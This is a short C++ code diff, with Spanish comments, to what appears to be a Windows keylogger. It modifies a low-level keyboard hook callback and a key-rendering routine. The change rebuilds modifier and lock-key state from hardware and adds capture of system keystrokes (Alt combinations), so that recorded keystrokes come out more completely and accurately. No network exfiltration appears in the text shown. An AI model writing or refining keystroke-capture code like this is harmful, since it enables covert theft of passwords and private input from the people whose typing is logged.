@@ -208,8 +208,20 @@ static std::string RenderKey(int key_stroke, HKL layout) {
     auto it = keyname.find(key_stroke);
     if (it != keyname.end()) return it->second;
 
+    // GetKeyboardState no refleja el estado real desde un hook de bajo nivel.
+    // Construimos el estado manualmente con GetAsyncKeyState (hardware).
     BYTE keyState[256] = {0};
-    GetKeyboardState(keyState);
+    if (GetAsyncKeyState(VK_SHIFT) & 0x8000)     keyState[VK_SHIFT] = 0x80;
+    if (GetAsyncKeyState(VK_LSHIFT) & 0x8000)    keyState[VK_LSHIFT] = 0x80;
+    if (GetAsyncKeyState(VK_RSHIFT) & 0x8000)    keyState[VK_RSHIFT] = 0x80;
+    if (GetAsyncKeyState(VK_CONTROL) & 0x8000)   keyState[VK_CONTROL] = 0x80;
+    if (GetAsyncKeyState(VK_LCONTROL) & 0x8000)  keyState[VK_LCONTROL] = 0x80;
+    if (GetAsyncKeyState(VK_RCONTROL) & 0x8000)  keyState[VK_RCONTROL] = 0x80;
+    if (GetAsyncKeyState(VK_MENU) & 0x8000)      keyState[VK_MENU] = 0x80;
+    if (GetAsyncKeyState(VK_LMENU) & 0x8000)     keyState[VK_LMENU] = 0x80;
+    if (GetAsyncKeyState(VK_RMENU) & 0x8000)     keyState[VK_RMENU] = 0x80;
+    if (GetKeyState(VK_CAPITAL) & 0x0001)         keyState[VK_CAPITAL] = 0x01;
+    if (GetKeyState(VK_NUMLOCK) & 0x0001)         keyState[VK_NUMLOCK] = 0x01;
 
     UINT scanCode = MapVirtualKeyEx(key_stroke, MAPVK_VK_TO_VSC, layout);
 
@@ -285,7 +297,7 @@ int Save(int key_stroke) {
 }
 
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (nCode >= 0 && wParam == WM_KEYDOWN) {
+    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
         kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
         Save(kbdStruct.vkCode);
     }
